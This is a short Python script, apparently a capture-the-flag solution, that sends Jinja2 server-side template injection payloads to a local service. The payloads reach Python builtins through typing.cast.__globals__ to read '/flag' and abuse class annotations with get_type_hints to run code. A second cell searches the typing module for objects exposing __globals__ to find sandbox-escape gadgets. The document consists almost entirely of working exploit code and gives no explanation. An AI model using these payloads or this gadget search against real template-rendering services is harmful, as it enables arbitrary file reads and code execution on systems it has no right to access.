#%%
import requests

payload = """
{{typing.cast.__globals__["__builtins__"]["open"]('/flag','r').read()}}
"""

payload = """
{% set _ = (myclass.__annotations__.update({"member": "print('pwn')"}), typing.get_type_hints(myclass)) %}
"""

payload = """
{{ typing.get_type_hints(typing.List[request.args.p]) }}
"""

print(requests.post(
    "http://127.0.0.1:1337",
    data={
        "content": payload
    }
).text)
# %%
import typing
from collections import defaultdict

last = defaultdict(list)
last[""].append(typing)
i = 4
visited = set()

results = []

while i > 0:
    i -= 1
    current = defaultdict(list)
    for path, parents in last.items():
        for parent in parents:
            if id(parent) in visited:
                continue
            visited.add(id(parent))

            if not hasattr(parent, "__name__"):
                name = type(parent).__name__
            else:
                name = parent.__name__

            for attr in dir(parent):
                try:
                    val = getattr(parent, attr)
                    current[path + "/" + name].append(val)

                    if hasattr(val, "__globals__"):
                        results.append(f"{path}/{name}/{attr}")
                        print(f"Found __globals__ at {path}/{name}/{attr}")
                        i = -1
                except Exception:
                    pass
            if i < 0:
                break
        if i < 0:
            break
    last = current

min(
    results,key=lambda v:len(v)
)
# %%
